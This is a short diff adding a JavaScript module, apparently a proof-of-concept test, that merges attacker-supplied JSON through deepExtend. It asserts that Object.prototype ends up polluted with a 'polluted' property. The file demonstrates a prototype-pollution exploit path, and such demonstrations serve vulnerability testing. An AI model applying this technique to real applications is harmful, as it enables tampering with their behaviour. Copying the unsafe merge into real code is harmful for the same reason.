@@ -1,0 +1,12 @@
+function exploitFunction(payload) {
+    const { translations } = payload;
+    const existingData = {};
+
+    expect({}.polluted).toBe(undefined);
+
+    deepExtend(existingData, JSON.parse(translations), true);
+
+    expect({}.polluted).toBe("yes");
+}
+
+module.exports = { exploitFunction };
